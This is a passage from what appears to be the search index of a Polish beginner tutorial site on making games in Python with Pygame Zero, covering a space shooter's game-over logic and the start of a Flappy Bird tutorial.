player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n\ndef update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n\ndef update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n\ndef choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n\ndef add_time():\n    if player.lifes &gt; 0:\n        player.time += 1\n\nclock.schedule_interval(add_time, 1)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#koniec-gry","title":"Koniec gry","text":"<p>Ostatnim elementem b\u0119dzie zako\u0144czenie gry, gdy utracimy wszystkie \u017cycia.</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#zatrzymujemy-gre","title":"Zatrzymujemy gr\u0119","text":"<p>Zacznijmy od zatrzymania gry po utracie wszystkich \u017cy\u0107. W tym celu na samym pocz\u0105tku funkcji update sprawdzimy, czy gracz ma zero \u017cy\u0107 lub mniej.</p> <pre><code>def update():\n    if player.lifes &lt;= 0:\n\n   ...\n</code></pre> <p>Je\u017celi tak, to u\u017cyjemy instrukcji return by wyj\u015b\u0107 z funkcji i nie aktualizowa\u0107 ju\u017c element\u00f3w gry.</p> <pre><code>def update():\n    if player.lifes &lt;= 0:\n        return\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#wyswietlamy-napis-game-over","title":"Wy\u015bwietlamy napis GAME OVER","text":"<p>Teraz przejd\u017amy do poinformowania gracza, \u017ce gra si\u0119 zako\u0144czy\u0142a. Na ko\u0144cu funkcji draw najpierw sprawdzimy, czy gracz ma zero \u017cy\u0107 lub mniej.</p> <pre><code>def draw():\n    ...\n    if player.lifes &lt;= 0:\n</code></pre> <p>Je\u017celi tak, to wy\u015bwietlimy napis GAME OVER. Umie\u015bcimy go dok\u0142adnie na \u015brodku ekranu, z czcionk\u0105 o rozmiarze \\(100\\) i czerwonym (red) kolorze.</p> <pre><code>def draw():\n    ...\n    if player.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=100, color=\"red\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_6","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\nplayer.lifes = 3\nplayer.time = 0\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    draw_list(enemy_lasers_list)\n    draw_list(enemies_list)\n    player.draw()\n    draw_lifes()\n    screen.draw.text(str(player.time), center=(WIDTH / 2, 40), fontsize=80, color=\"yellow\")\n    if player.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=100, color=\"red\")\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n\ndef update():\n    if player.lifes &lt;= 0:\n        return\n\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n\ndef update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n\ndef update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n\ndef choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n\ndef add_time():\n    if player.lifes &gt; 0:\n        player.time += 1\n\nclock.schedule_interval(add_time, 1)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#pena-gra","title":"Pe\u0142na gra","text":"<p>Nasza gra jest gotowa, a jej pe\u0142en kod widoczny jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\nplayer.lifes = 3\nplayer.time = 0\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    draw_list(enemy_lasers_list)\n    draw_list(enemies_list)\n    player.draw()\n    draw_lifes()\n    screen.draw.text(str(player.time), center=(WIDTH / 2, 40), fontsize=80, color=\"yellow\")\n    if player.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=100, color=\"red\")\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    for life_id in range(1, player.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n\ndef update():\n    if player.lifes &lt;= 0:\n        return\n\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n\n        if random.random() &lt; 0.005:\n            laser = Actor(\"laser2\")\n            laser.pos = enemy.pos\n            laser.angle = enemy.angle\n            laser.v = random.randint(5, 10)\n            enemy_lasers_list.append(laser)\n            sounds.laser2.play()\n\ndef update_enemy_lasers():\n    for laser in enemy_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            enemy_lasers_list.remove(laser)\n\ndef update_collisions():\n    for laser in player_lasers_list[:]:\n        for enemy in enemies_list[:]:\n            if enemy.colliderect(laser):\n                enemies_list.remove(enemy)\n                player_lasers_list.remove(laser)\n                break\n\n    for enemy in enemies_list[:]:\n        if player.collidepoint(enemy.pos):\n            enemies_list.remove(enemy)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\n    for laser in enemy_lasers_list[:]:\n        if player.collidepoint(laser.pos):\n            enemy_lasers_list.remove(laser)\n            player.lifes -= 1\n            if player.lifes == 0:\n                sounds.game_over.play()\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n\ndef choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n\ndef add_time():\n    if player.lifes &gt; 0:\n        player.time += 1\n\nclock.schedule_interval(add_time, 1)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/","title":"Flappy Bird","text":""},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#wstep","title":"Wst\u0119p","text":"<p>Dzisiaj odtworzymy jedn\u0105 z kultowych gier mobilnych: Flappy Bird.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak doda\u0107 grawitacj\u0119 i skok/latanie do gry.</li> <li>Jak stworzy\u0107 i obs\u0142u\u017cy\u0107 proste menu.</li> <li>Jak stworzy\u0107 \"niesko\u0144czon\u0105\" gr\u0119 bazuj\u0105c\u0105 na prostych za\u0142o\u017ceniach.</li> <li>Jak zaimplementowa\u0107 proste efekty wizualne.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#grafiki-do-pobrania","title":"Grafiki do pobrania","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry Flappy Bird</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#efekty-dzwiekowe-do-pobrania","title":"Efekty d\u017awi\u0119kowe do pobrania","text":"<p>Umieszczamy w katalogu sounds.</p> <p> Efekty d\u017awi\u0119kowe do gry Flappy Bird</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>Grafiki przycisk\u00f3w pochodz\u0105 ze strony: https://kenney.nl/.</li> <li>Pozosta\u0142e grafiki pochodz\u0105 ze strony projektu pgzero: https://github.com/lordmauve/pgzero/tree/master/examples/flappybird/images.</li> <li>Efekty d\u017awi\u0119kowe pochodz\u0105 ze strony: https://www.sounds-resource.com/mobile/flappybird/sound/5309/.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#nasz-cel","title":"Nasz cel","text":""},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#wstepna-konfiguracja","title":"Wst\u0119pna konfiguracja","text":"<p>Zaczynamy standardowo: tworzymy nowy projekt, instalujemy bibliotek\u0119, pobieramy materia\u0142y i umieszczamy je w odpowiednich miejscach. Nasz projekt mo\u017cemy nazwa\u0107 np. \"FlappyBird\". Gdy ju\u017c utworzymy projekt, tworzymy w nim dwa nowe katalogi: images oraz sounds. Nast\u0119pnie pobieramy wy\u017cej wymienione materia\u0142y, rozpakowujemy je, a zawarto\u015b\u0107 przerzucamy do odpowiednich katalog\u00f3w. Pozosta\u0142o nam jeszcze zainstalowa\u0107 bibliotek\u0119: w okienku terminala wypisujemy standardowo polecenie <code>pip install pgzero</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#tworzymy-okno-gry","title":"Tworzymy okno gry","text":"<p>Jak zwykle zaczynamy od podstaw. Wymiary naszego okna s\u0105 zale\u017cne od wymiar\u00f3w grafiki t\u0142a i wynosz\u0105 \\(400\\times700\\). Ustawiamy wi\u0119c odpowiednie wymiary i wype\u0142niamy t\u0142o grafik\u0105 bg.png za pomoc\u0105 polecenia <code>screen.blit()</code>. Mo\u017cemy tak\u017ce skonfigurowa\u0107 tytu\u0142 naszej gry.</p> <pre><code># Importujemy potrzebne biblioteki\nimport pgzrun\nimport random\n\n# Ustalamy wymiary okna gry\nWIDTH = 400\nHEIGHT = 700\n\n# Ustalamy tytu\u0142 okna gry\nTITLE = \"Pygame Zero Flappy Bird\"\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Rysujemy t\u0142o gry\n    screen.blit(\"bg\", (0, 0))\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    pass\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#ptak","title":"Ptak","text":"<p>Zacznijmy od naszej g\u0142\u00f3wnej postaci: ptaka.</p>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#dodajemy-aktora","title":"Dodajemy aktora","text":"<p>Na samym pocz\u0105tku dodajemy nowego aktora z grafiki bird1.png. Umie\u015bcimy go z lewej strony ekranu, na \u015brodku, pod wsp\u00f3\u0142rz\u0119dnymi \\((75, 200)\\).</p> <pre><code>bird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#rysujemy","title":"Rysujemy","text":"<p>Wy\u015bwietlmy nasz\u0105 now\u0105 posta\u0107 na ekranie. Na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej dopisujemy polecenie rysuj\u0105ce ptaka: <code>bird.draw()</code>.</p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n    bird.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#grawitacja","title":"Grawitacja","text":"<p>Jak na razie nasza posta\u0107 jest bardzo statyczna i tkwi w jednym miejscu. Urozmai\u0107my wi\u0119c troch\u0119 jej \u017cycie i dodajmy si\u0142\u0119 grawitacji. Grawitacja w naszej grze b\u0119dzie dzia\u0142a\u0107 podobnie do tej, kt\u00f3r\u0105 znamy z codziennego \u017cycia: b\u0119dzie \u015bci\u0105ga\u0107 posta\u0107 w d\u00f3\u0142. Zanim jednak b\u0119dziemy mogli doda\u0107 oddzia\u0142ywanie grawitacji na posta\u0107, musimy ustali\u0107 si\u0142\u0119 grawitacji. Dodajmy wi\u0119c zmienn\u0105 GRAVITY na pocz\u0105tku naszego kodu, zaraz pod wymiarami okna, i przypiszmy jej warto\u015b\u0107 \\(0.3\\). Nazw\u0119 zmiennej podamy z wielkich liter, poniewa\u017c mo\u017cemy j\u0105 potraktowa\u0107 jako jedno z ustawie\u0144 naszej gry. Co wi\u0119cej, warto\u015bci grawitacji nie b\u0119dziemy modyfikowa\u0107 w trakcie rozgrywki, mo\u017cna wi\u0119c powiedzie\u0107, \u017ce jest to warto\u015b\u0107 sta\u0142a.</p> <pre><code>GRAVITY = 0.3\n</code></pre> <p>Teraz czas zaaplikowa\u0107 grawitacj\u0119 do postaci ptaka. Grawitacja powinna wp\u0142ywa\u0107 na pr\u0119dko\u015b\u0107 pionow\u0105 postaci, musimy wi\u0119c t\u0119 pr\u0119dko\u015b\u0107 dopisa\u0107 do naszego aktora. Do ptaka, zaraz pod ustaleniem jego pozycji na ekranie, dopisujemy zmienn\u0105 vy i przypisujemy jej pocz\u0105tkow\u0105 warto\u015b\u0107 \\(0\\).</p> <pre><code>bird.vy = 0\n</code></pre> <p>W celu zachowania czytelno\u015bci i przejrzysto\u015bci kodu stworzymy now\u0105 funkcj\u0119 update_bird, zaraz pod funkcj\u0105 update.</p> <pre><code>def update_bird():\n</code></pre> <p>Chcemy, aby w ka\u017cdej klatce animacji pr\u0119dko\u015b\u0107 postaci by\u0142a zwi\u0119kszana o si\u0142\u0119 grawitacji. </p> <pre><code>def update_bird():\n    bird.vy += GRAVITY\n</code></pre> <p>Z kolei pozycja aktora powinna si\u0119 zmienia\u0107 zgodnie z jego pr\u0119dko\u015bci\u0105. </p> <pre><code>def update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n</code></pre> <p>Pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 funkcj\u0119 w cz\u0119\u015bci aktualizuj\u0105cej. Z funkcji update usuwamy wi\u0119c polecenie <code>pass</code> i dopisujemy wywo\u0142anie naszej funkcji update_bird.</p> <pre><code>def update():\n    update_bird()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#latanie","title":"Latanie","text":"<p>Mamy ju\u017c grawitacj\u0119, czas wi\u0119c doda\u0107 mo\u017cliwo\u015b\u0107 pr\u00f3by przezwyci\u0119\u017cenia tej wielkiej si\u0142y: zdolno\u015b\u0107 latania. W celu zasymulowania unoszenia si\u0119 postaci do g\u00f3ry wystarczy, \u017ce nadamy jej odpowiedni\u0105 pr\u0119dko\u015b\u0107 wzlotow\u0105. Pr\u0119dko\u015b\u0107 ta, podobnie jak grawitacja, b\u0119dzie jednym z ustawie\u0144 naszej gry. W zwi\u0105zku z tym tworzymy zmienn\u0105 FLAP zaraz pod zmienn\u0105 GRAVITY i przypisujemy jej wybran\u0105 warto\u015b\u0107, np. \\(7\\).</p> <pre><code>FLAP = 7\n</code></pre> <p>Nasza posta\u0107 b\u0119dzie podnosi\u0107 si\u0119 lekko do g\u00f3ry za ka\u017cdym razem, gdy wci\u015bniemy jaki\u015b (dowolny) przycisk na myszce. Potrzebna nam wi\u0119c funkcja <code>on_mouse_down</code>, kt\u00f3ra przyjmuje parametr pos oznaczaj\u0105cy pozycj\u0119 myszy na ekranie (teraz nie jest nam to potrzebne, ale p\u00f3\u017aniej si\u0119 przyda). Dopisujemy j\u0105 na ko\u0144cu kodu, zaraz przed wywo\u0142aniem <code>pgzrun.go()</code>. Wewn\u0105trz po prostu przypisujemy do pr\u0119dko\u015bci pionowej (vy) ptaka ujemn\u0105 warto\u015b\u0107 naszej pr\u0119dko\u015bci wzlotowej (FLAP). Przypisujemy ujemn\u0105 pr\u0119dko\u015b\u0107, poniewa\u017c chcemy, by ptak polecia\u0142 do g\u00f3ry.</p> <pre><code>def on_mouse_down(pos):\n    bird.vy = -FLAP\n</code></pre> <p>Dodajmy tak\u017ce odtworzenie d\u017awi\u0119ku machni\u0119cia skrzyde\u0142kami (wing).</p> <pre><code>def on_mouse_down(pos):\n    bird.vy = -FLAP\n    sounds.wing.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\n# Si\u0142a grawitacji\nGRAVITY = 0.3\n# Pr\u0119dko\u015b\u0107 wzlotowa\nFLAP = 7\n\n# Tworzymy aktora ptaka\nbird = Actor(\"bird1\")\n# Ustalamy jego pozycj\u0119 na ekranie\nbird.x = 75\nbird.y = 200\n# Ustalamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pionow\u0105 ptaka\nbird.vy = 0\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    # Rysujemy ptaka\n    bird.draw()\n\ndef update():\n    # Aktualizujemy ptaka\n    update_bird()\n\n# Pomocnicza funkcja aktualizuj\u0105ca ptaka\ndef update_bird():\n    # Zwi\u0119kszamy pr\u0119dko\u015b\u0107 pionow\u0105 zgodnie z si\u0142\u0105 grawitacji\n    bird.vy += GRAVITY\n    # Przemieszczamy ptaka zgodnie z jego pr\u0119dko\u015bci\u0105\n    bird.y += bird.vy\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia myszy\ndef on_mouse_down(pos):\n    # Symulujemy wzlot ptaka\n    bird.vy = -FLAP\n    # Odtwarzamy d\u017awi\u0119k machni\u0119cia skrzyde\u0142kami\n    sounds.wing.play()\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#rury","title":"Rury","text":"<p>Czas doda\u0107 naszego przeciwnika w grze: rury. Jak zwykle zaczynamy od dodania nowych aktor\u00f3w. Tym razem b\u0119dzie ich dw\u00f3ch: g\u00f3rna rura (<code>pipe_top</code>) i dolna rura (<code>pipe_bottom</code>). Utworzymy ich tak jak zazwyczaj z niewielk\u0105 r\u00f3\u017cnic\u0105: ustalimy im odpowiednie kotwice (ang. anchor). Kotwica pozwala nam wybra\u0107 punkt grafiki, wed\u0142ug kt\u00f3rego b\u0119dziemy j\u0105 umieszcza\u0107 na ekranie. Mo\u017cna to sobie wyobrazi\u0107 jako miejsce, w kt\u00f3rym \"trzymamy\" grafik\u0119, gdy j\u0105 przemieszczamy. Domy\u015blnie grafik\u0119 poruszamy wzgl\u0119dem jej \u015brodka, ale mo\u017cemy te\u017c wybra\u0107 inne miejsce zaczepienia. Ze wzgl\u0119du na charakter rur w naszej grze jest to du\u017ce u\u0142atwienie.</p> <p>Dla g\u00f3rnej rury ustawimy kotwic\u0119 w jej lewym dolnym rogu. Dla dolnej rury natomiast ustawimy kotwic\u0119 w jej lewym g\u00f3rnym rogu.</p> <pre><code>pipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#rysujemy-rury","title":"Rysujemy rury","text":"<p>Gdy ju\u017c mamy aktor\u00f3w, czas ich wy\u015bwietli\u0107 na ekranie. Dodajemy dwie instrukcje w cz\u0119\u015bci rysuj\u0105cej naszej gry. Narysujemy je przed narysowaniem postaci ptaka, \u017ceby go nie zas\u0142ania\u0142y.</p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n    pipe_top.draw()\n    pipe_bottom.draw()\n    bird.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#ustawiamy-pozycje-rur","title":"Ustawiamy pozycj\u0119 rur","text":"<p>G\u0142\u00f3wn\u0105 trudno\u015bci\u0105 w naszej grze b\u0119dzie niewielka przestrze\u0144 pomi\u0119dzy rurami, przez kt\u00f3r\u0105 musimy przelecie\u0107. Rozmiar tej przestrzeni zapiszemy jako ustawienie w zmiennej GAP_SIZE. Nasz\u0105 now\u0105 zmienn\u0105 zapisujemy zaraz pod zmienn\u0105 FLAP i nadamy jej warto\u015b\u0107 \\(180\\).</p> <pre><code>GAP_SIZE = 180\n</code></pre> <p>\u017beby gra nie by\u0142a zbyt przewidywalna, przestrze\u0144 pomi\u0119dzy rurami powinna pojawia\u0107 si\u0119 na losowej wysoko\u015bci.  Stworzymy wi\u0119c funkcj\u0119 <code>set_pipes</code> za pomoc\u0105 kt\u00f3rej b\u0119dziemy losowa\u0107 now\u0105 pozycj\u0119 rur. Nasz\u0105 funkcj\u0119 dopiszemy na ko\u0144cu naszego kodu, zaraz przed wywo\u0142aniem pgzrun.go().</p> <pre><code>def set_pipes():\n</code></pre> <p>Pierwsz\u0105 operacj\u0105 w naszej funkcji b\u0119dzie wylosowanie pozycji pionowej \u015brodka naszej dziury. Zapiszemy j\u0105 w zmiennej gap_y, a do wylosowania warto\u015bci skorzystamy z funkcji random.randint. Jako przedzia\u0142 losowanej warto\u015bci warto poda\u0107 takie liczby, \u017ceby dziura nie pojawia\u0142a si\u0119 na skraju ekranu, czyli np. \\((200, 500)\\).</p> <pre><code>def set_pipes():\n    gap_y = random.randint(200, 500)\n</code></pre> <p>Teraz mo\u017cemy przypisa\u0107 nowe pozycje naszych rur. Ustawimy je poza praw\u0105 stron\u0105 ekranu, tak by mog\u0142y p\u0142ynnie \"wjecha\u0107\" na ekran gry. W tym celu do ich wsp\u00f3\u0142rz\u0119dnej x przypiszemy szeroko\u015b\u0107 (WIDTH) ekranu. Je\u017celi chodzi o wsp\u00f3\u0142rz\u0119dn\u0105 y to g\u00f3rna rura powinna by\u0107 po\u0142o\u017cona ponad wsp\u00f3\u0142rz\u0119dn\u0105 gap_y, a dolna pod ni\u0105. Obie natomiast powinny by\u0107 oddalone od tego \u015brodka dok\u0142adnie o po\u0142ow\u0119 rozmiaru przerwy (GAP_SIZE).</p> <pre><code>def set_pipes():\n    gap_y = 